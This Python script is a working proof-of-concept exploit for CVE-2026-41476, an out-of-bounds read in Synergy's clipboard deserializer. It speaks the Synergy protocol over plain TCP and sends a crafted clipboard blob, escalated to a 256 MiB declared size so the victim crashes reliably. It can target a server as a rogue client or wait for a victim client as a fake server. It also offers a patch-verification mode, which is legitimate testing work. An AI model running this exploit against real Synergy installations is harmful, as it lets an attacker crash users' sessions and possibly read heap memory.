#!/usr/bin/env python3
"""
Synergy clipboard unmarshall out-of-bounds read — CVE-2026-41476.

The Synergy network protocol (port 24800 by default) carries clipboard
contents between server and connected clients. The deserializer is
`IClipboard::unmarshall` in `src/lib/deskflow/IClipboard.cpp`. Wire format
of the marshalled blob:

    UInt32  numFormats
    repeated:
        UInt32  formatId
        UInt32  size
        size bytes of payload

Pre-fix, the function reads each `size` field straight from the peer and
then constructs `String(index, size)` without ever checking that `size`
bytes remain in the buffer. A malicious peer can declare a large `size`
with a tiny actual payload, and the parser reads `size` bytes past the end
of the heap-allocated chunk buffer. Result: process crash (DoS) or
heap-memory disclosure if the resulting clipboard string ends up
re-broadcast.

The advisory's minimum reproducer is a 12-byte blob:

    numFormats=1, formatId=0 (kText), size=4096, then ZERO payload bytes

Pre-fix `unmarshall` honours `size=4096` and reads 4096 bytes of adjacent
heap. Post-fix it logs `clipboard unmarshall: payload size 4096 exceeds
remaining 0` and bails cleanly without touching the clipboard.

Modes:

    --mode exploit
        Sends the malicious blob and reports VULNERABLE if the peer
        crashes (TCP connection drops within the post-payload window).

    --mode fix-test
        Same probe; reports PASS if the peer is still responsive
        (CNOP heartbeat round-trips) after the bad clipboard.

    --mode auto (default)
        Sends the probe and decides the verdict from observed behaviour.

Targets:

    --target server (default)
        Connect to a victim Synergy server as a malicious client. The
        server config must allow our screen name (default: "synergy-poc").

    --target client
        Bind a fake server, wait for the victim client to connect, then
        push the malicious clipboard from the server side. The victim
        client must be configured to connect to this host.

TLS:

    The PoC speaks plain TCP. Disable TLS on the target before testing
    (Settings -> uncheck "Use TLS encryption", or run with
    `--enable-crypto` absent). The synergy app id default is TLS-on, so
    this is usually a config change, not a build change.
"""

import argparse
import os
import socket
import struct
import sys
import time

DEFAULT_PORT = 24800
DEFAULT_HOST = "127.0.0.1"
DEFAULT_NAME = "synergy-poc"

PROTO_MAJOR = 1
PROTO_MINOR = 8

# IClipboard::EFormat::kText, from src/lib/deskflow/IClipboard.h
CLIPBOARD_FMT_TEXT = 0

# ChunkType, from src/lib/deskflow/protocol_types.h
CHUNK_DATA_START = 1
CHUNK_DATA_CHUNK = 2
CHUNK_DATA_END = 3

if os.name == "nt":
    import ctypes
    import ctypes.wintypes as wt

    _kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    def _enable_vt():
        try:
            h = _kernel32.GetStdHandle(-11)
            mode = wt.DWORD()
            if _kernel32.GetConsoleMode(h, ctypes.byref(mode)):
                _kernel32.SetConsoleMode(h, mode.value | 0x0004)
        except OSError:
            pass
else:
    def _enable_vt():
        pass


_GREEN, _RED, _YELLOW, _GRAY, _RESET = "\033[32m", "\033[31m", "\033[33m", "\033[90m", "\033[0m"
_PASS = f"{_GREEN}[PASS]{_RESET}"
_FAIL = f"{_RED}[FAIL]{_RESET}"
_CHECK = f"{_YELLOW}[CHECK LOG]{_RESET}"
_NA = f"{_GRAY}[N/A]{_RESET}"


def _verdict(ok, msg):
    """ok=True -> green PASS, ok=False -> red FAIL, ok=None -> yellow CHECK LOG."""
    marker = _PASS if ok is True else _FAIL if ok is False else _CHECK
    print(f"         {marker} {msg}")


# ===========================================================================
# Wire format helpers
# ===========================================================================
#
# Synergy frames every protocol message as `<UInt32-BE length><payload>`. The
# inner format strings (kMsgHello = "Synergy%2i%2i", kMsgDInfo = "DINF%2i...")
# are documented in src/lib/deskflow/protocol_types.cpp. `%2i` is a UInt16-BE,
# `%4i` is a UInt32-BE, `%1i` is a UInt8, `%s` is a UInt32-BE-prefixed byte
# string.

def _frame(payload: bytes) -> bytes:
    return struct.pack(">I", len(payload)) + payload


def _build_hello_back(name: str, major: int = PROTO_MAJOR, minor: int = PROTO_MINOR) -> bytes:
    name_bytes = name.encode("utf-8")
    return _frame(b"Synergy" + struct.pack(">HH", major, minor)
                  + struct.pack(">I", len(name_bytes)) + name_bytes)


def _build_hello(major: int = PROTO_MAJOR, minor: int = PROTO_MINOR) -> bytes:
    return _frame(b"Synergy" + struct.pack(">HH", major, minor))


def _build_dinfo(x=0, y=0, w=1920, h=1080, warp=0, mx=960, my=540) -> bytes:
    return _frame(b"DINF" + struct.pack(">HHHHHHH", x, y, w, h, warp, mx, my))


def _build_qinfo() -> bytes:
    return _frame(b"QINF")


def _build_cnop() -> bytes:
    return _frame(b"CNOP")


def _build_calv() -> bytes:
    return _frame(b"CALV")


def _build_dclp(clipboard_id: int, sequence: int, mark: int, data: bytes) -> bytes:
    """kMsgDClipboard = 'DCLP%1i%4i%1i%s'"""
    inner = (b"DCLP"
             + struct.pack(">B", clipboard_id)
             + struct.pack(">I", sequence)
             + struct.pack(">B", mark)
             + struct.pack(">I", len(data)) + data)
    return _frame(inner)


# The advisory's canonical 12-byte reproducer uses size=4096. That's enough
# to demonstrate the OOB read but on Windows the read often lands in mapped
# memory adjacent to dataCached's SSO buffer (small std::strings live inline
# in the object), so the process doesn't crash and the bug is silent.
#
# To get a deterministic crash signal we escalate the declared `size` until
# the read either (a) blows past the end of mapped memory or (b) trips the
# String ctor's allocator. 0x10000000 (256 MiB) is large enough that memcpy
# is guaranteed to walk off any plausible heap region within microseconds.
ADVISORY_OOB_SIZE = 4096
ESCALATED_CRASH_SIZE = 0x10000000


def malicious_clipboard_blob(size: int = ADVISORY_OOB_SIZE) -> bytes:
    """Build a 12-byte clipboard blob declaring `size` bytes of payload.

    numFormats=1, formatId=kText, size=<size>, then ZERO payload bytes.
    Pre-fix unmarshall reads `size` bytes past the end of the chunk buffer.
    """
    return (struct.pack(">I", 1)
            + struct.pack(">I", CLIPBOARD_FMT_TEXT)
            + struct.pack(">I", size))


# ===========================================================================
# Synergy peer (raw TCP, no TLS)
# ===========================================================================

class SynergyPeer:
    """Minimal synergy network-protocol peer.

    Use `connect_as_client(host, port, name)` to attach to a victim server,
    or `accept_as_server(host, port)` to wait for a victim client to connect.
    Both paths leave the peer in a state where it can send DCLP chunks and
    issue heartbeat probes.
    """

    def __init__(self, sock, timeout=5.0):
        self._sock = sock
        self._sock.settimeout(timeout)
        self._timeout = timeout

    @classmethod
    def connect_as_client(cls, host, port, name, timeout=5.0):
        s = socket.create_connection((host, port), timeout=timeout)
        peer = cls(s, timeout=timeout)
        peer._client_handshake(name)
        return peer

    @classmethod
    def accept_as_server(cls, host, port, accept_timeout=60.0, timeout=5.0):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((host, port))
        listener.listen(1)
        listener.settimeout(accept_timeout)
        try:
            conn, addr = listener.accept()
        finally:
            listener.close()
        print(f"[*] Accepted client from {addr[0]}:{addr[1]}")
        peer = cls(conn, timeout=timeout)
        peer._server_handshake()
        return peer

    def _recv_exact(self, n, timeout=None):
        if timeout is not None:
            self._sock.settimeout(timeout)
        buf = bytearray()
        while len(buf) < n:
            chunk = self._sock.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("peer closed connection during read")
            buf.extend(chunk)
        return bytes(buf)

    def _recv_packet(self, timeout=None):
        size_bytes = self._recv_exact(4, timeout=timeout)
        size = struct.unpack(">I", size_bytes)[0]
        if size == 0:
            return b""
        return self._recv_exact(size, timeout=timeout)

    def _send(self, frame_bytes):
        self._sock.sendall(frame_bytes)

    def _client_handshake(self, name):
        # Server speaks first: kMsgHello = "Synergy" + UInt16 major + UInt16 minor.
        hello = self._recv_packet(timeout=self._timeout)
        if not hello.startswith(b"Synergy"):
            raise RuntimeError(f"unexpected hello from server: {hello!r}")
        major, minor = struct.unpack(">HH", hello[7:11])
        print(f"[*] Server hello: protocol {major}.{minor}")
        # Reply with HelloBack at our claimed version.
        self._send(_build_hello_back(name))
        # The server's parseHandshakeMessage only progresses when it receives
        # DINF — without this we can never send DCLP. CNOP would be accepted
        # but doesn't flip parser state.
        self._send(_build_dinfo())
        print(f"[*] Sent HelloBack as \"{name}\" + DInfo")

    def _server_handshake(self):
        # We are the server side: send kMsgHello first.
        self._send(_build_hello())
        helloback = self._recv_packet(timeout=self._timeout)
        if not helloback.startswith(b"Synergy"):
            raise RuntimeError(f"unexpected helloback from client: {helloback!r}")
        major, minor = struct.unpack(">HH", helloback[7:11])
        name_len = struct.unpack(">I", helloback[11:15])[0]
        name = helloback[15:15 + name_len].decode("utf-8", errors="replace")
        print(f"[*] Client hello: \"{name}\" protocol {major}.{minor}")
        # Ask for the client's screen info so the client's ServerProxy gets
        # past handshake state. The client replies with DINF; we don't care
        # about the contents but must drain it from the wire.
        self._send(_build_qinfo())
        try:
            dinfo = self._recv_packet(timeout=self._timeout)
            print(f"[*] Got client DInfo ({len(dinfo)} bytes)")
        except (socket.timeout, ConnectionError):
            print("[!] Client did not send DInfo within timeout — proceeding anyway")

    def send_clipboard(self, blob: bytes, clipboard_id=0, sequence=1):
        """Push `blob` over the wire as a chunked DCLP transfer.

        The kStart message announces the expected total size (ASCII decimal,
        length-prefixed string). The kEnd handler in ClipboardChunk::assemble
        validates `s_expectedSize == dataCached.size()` — they must match or
        the chunk is dropped before unmarshall is invoked.
        """
        size_str = str(len(blob)).encode("ascii")
        self._send(_build_dclp(clipboard_id, sequence, CHUNK_DATA_START, size_str))
        self._send(_build_dclp(clipboard_id, sequence, CHUNK_DATA_CHUNK, blob))
        self._send(_build_dclp(clipboard_id, sequence, CHUNK_DATA_END, b""))

    def is_alive(self, probe_timeout=2.0):
        """Heartbeat probe. Returns True if the peer is still responsive.

        Sends a CNOP (silent no-op, accepted in any state). If the underlying
        TCP connection has been reset (peer crash), sendall or the subsequent
        peek will raise. We also peek for any unread bytes — if the peer FIN'd
        cleanly, recv will return b"".
        """
        try:
            self._send(_build_cnop())
        except OSError:
            return False
        # Give the peer a moment, then peek.
        self._sock.settimeout(probe_timeout)
        try:
            self._sock.setblocking(False)
            try:
                data = self._sock.recv(1, socket.MSG_PEEK)
                if data == b"":
                    return False  # FIN
                # Drain the actual peeked byte by reading it normally; we may
                # see legit traffic (CALV, CNOP) and that's a sign of life.
                return True
            except BlockingIOError:
                # No data waiting, but socket is open — peer alive.
                return True
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                return False
        finally:
            self._sock.setblocking(True)
            self._sock.settimeout(self._timeout)

    def close(self):
        try:
            self._sock.close()
        except OSError:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


# ===========================================================================
# Probes & verdict
# ===========================================================================

def _send_and_check(peer: SynergyPeer, blob: bytes, sequence: int, settle: float = 1.0) -> bool:
    """Send one chunked DCLP transfer and return True if peer is still alive."""
    try:
        peer.send_clipboard(blob, sequence=sequence)
    except OSError as e:
        print(f"    send failed mid-transfer: {e}")
        return False
    time.sleep(settle)
    return peer.is_alive(probe_timeout=2.0)


def run_probe(peer: SynergyPeer, mode: str, settle: float = 1.0,
              escalate: bool = True, override_size: int = None):
    """Two-phase probe.

    Phase 1: send the advisory's canonical blob (size=4096). If the peer
    crashes -> VULNERABLE confirmed. If it survives, the bug may still be
    present but the OOB read landed in mapped memory.

    Phase 2 (default on): escalate to a much larger declared size so the
    read is guaranteed to walk off mapped memory and the std::string ctor
    is guaranteed to either bad_alloc or AV during memcpy. A surviving peer
    after Phase 2 is strong evidence the fix is in.
    """
    if override_size is not None:
        # User-pinned size: single phase, no escalation.
        blob = malicious_clipboard_blob(override_size)
        print(f"[*] Sending malicious clipboard blob: {blob.hex()} ({len(blob)} bytes)")
        print(f"    declares numFormats=1, formatId=kText(0), size={override_size:#x}, payload=<empty>")
        alive = _send_and_check(peer, blob, sequence=1, settle=settle)
        if alive:
            _verdict(True if mode == "fix-test" else None,
                     "peer survived. With the override size pinned, no escalation.")
        else:
            _verdict(False, "peer dropped TCP connection — VULNERABLE (CVE-2026-41476).")
        return

    blob1 = malicious_clipboard_blob(ADVISORY_OOB_SIZE)
    print(f"[*] Phase 1: advisory canonical blob (size={ADVISORY_OOB_SIZE})")
    print(f"    {blob1.hex()} ({len(blob1)} bytes)")
    alive = _send_and_check(peer, blob1, sequence=1, settle=settle)
    if not alive:
        _verdict(False,
                 "peer dropped TCP connection after canonical blob — "
                 "VULNERABLE (CVE-2026-41476).")
        return

    print(f"[*] Phase 1 did not crash the peer. The 4096-byte OOB read may have "
          f"landed in mapped memory (info disclosure rather than DoS).")

    if not escalate:
        _verdict(None,
                 "peer survived the canonical advisory blob. Without escalation, "
                 "cannot distinguish 'fix in place' from 'silent OOB read'. "
                 "Re-run without --no-escalate to confirm.")
        return

    blob2 = malicious_clipboard_blob(ESCALATED_CRASH_SIZE)
    print(f"[*] Phase 2: escalated blob (size={ESCALATED_CRASH_SIZE:#x} = {ESCALATED_CRASH_SIZE // (1024*1024)} MiB)")
    print(f"    {blob2.hex()} ({len(blob2)} bytes)")
    print(f"    Pre-fix: std::string ctor either bad_allocs or AVs during memcpy -> crash.")
    print(f"    Post-fix: 'payload size {ESCALATED_CRASH_SIZE} exceeds remaining 0' -> clean reject.")
    alive = _send_and_check(peer, blob2, sequence=2, settle=settle)
    if not alive:
        _verdict(False,
                 f"peer dropped TCP connection after escalated blob — "
                 f"VULNERABLE (CVE-2026-41476). Phase 1's silent OOB read confirms "
                 f"info-disclosure surface; Phase 2 confirms DoS surface.")
    else:
        _verdict(True,
                 "peer survived BOTH the canonical and escalated malicious blobs — "
                 "fix is in place. Pre-fix builds reliably crash on the escalated blob.")


# ===========================================================================
# Main
# ===========================================================================

def mode_attack_server(host, port, name, mode, escalate, override_size):
    print("=" * 72)
    print(f"CVE-2026-41476 — clipboard unmarshall OOB read against synergy server")
    print(f"target: {host}:{port}  screen name: {name!r}  mode: {mode}")
    print("=" * 72)
    print(f"Expected on pre-fix:  FAIL — server crashes; TCP connection drops.")
    print(f"Expected on post-fix: PASS — server logs error and stays up.\n")

    try:
        peer = SynergyPeer.connect_as_client(host, port, name)
    except (OSError, RuntimeError) as e:
        print(f"[!] Could not connect/handshake: {e}")
        print("    Is the synergy server running with TLS off?")
        print(f"    Is screen name {name!r} configured on the server?")
        return 2

    with peer:
        run_probe(peer, mode=mode, escalate=escalate, override_size=override_size)
    return 0


def mode_attack_client(bind_host, bind_port, mode, accept_timeout, escalate, override_size):
    print("=" * 72)
    print(f"CVE-2026-41476 — clipboard unmarshall OOB read against synergy client")
    print(f"listening on {bind_host}:{bind_port}  mode: {mode}")
    print("=" * 72)
    print(f"Configure the victim client to connect to {bind_host}:{bind_port} with TLS off.")
    print(f"Waiting up to {accept_timeout:.0f}s for it to connect...\n")
    print(f"Expected on pre-fix:  FAIL — client crashes; TCP connection drops.")
    print(f"Expected on post-fix: PASS — client logs error and stays up.\n")

    try:
        peer = SynergyPeer.accept_as_server(bind_host, bind_port, accept_timeout=accept_timeout)
    except socket.timeout:
        print(f"[!] No client connected within {accept_timeout:.0f}s.")
        return 2
    except OSError as e:
        print(f"[!] Could not bind/accept on {bind_host}:{bind_port}: {e}")
        return 2

    with peer:
        # Give the client's parser a moment to settle into ServerProxy state.
        time.sleep(0.5)
        run_probe(peer, mode=mode, escalate=escalate, override_size=override_size)
    return 0


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--target", choices=("server", "client"), default="server",
                    help="Which peer to attack. 'server' connects out as a "
                         "malicious client. 'client' binds and waits for the "
                         "victim client to connect to us.")
    ap.add_argument("--mode", choices=("auto", "exploit", "fix-test"), default="auto",
                    help="auto: report verdict from observed behaviour. "
                         "exploit: expect crash on pre-fix. "
                         "fix-test: expect no crash on post-fix.")
    ap.add_argument("--host", default=DEFAULT_HOST,
                    help=f"Target host (--target server) or bind host (--target client). Default {DEFAULT_HOST}.")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT,
                    help=f"Target / bind port. Default {DEFAULT_PORT}.")
    ap.add_argument("--name", default=DEFAULT_NAME,
                    help=f"Screen name announced to the server (--target server only). "
                         f"Must match a screen configured on the victim. Default {DEFAULT_NAME!r}.")
    ap.add_argument("--accept-timeout", type=float, default=60.0,
                    help="How long to wait for an inbound client (--target client). Default 60s.")
    ap.add_argument("--no-escalate", action="store_true",
                    help="Skip the size escalation phase. Only useful for matching the "
                         "advisory's exact 12-byte/size=4096 reproducer.")
    ap.add_argument("--size", type=lambda x: int(x, 0), default=None,
                    help="Pin the declared `size` field to this value (decimal or 0x hex). "
                         "Disables escalation. Useful for fuzzing.")
    args = ap.parse_args()
    _enable_vt()

    escalate = not args.no_escalate
    if args.target == "server":
        return mode_attack_server(args.host, args.port, args.name, args.mode,
                                  escalate=escalate, override_size=args.size)
    else:
        return mode_attack_client(args.host, args.port, args.mode, args.accept_timeout,
                                  escalate=escalate, override_size=args.size)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(130)
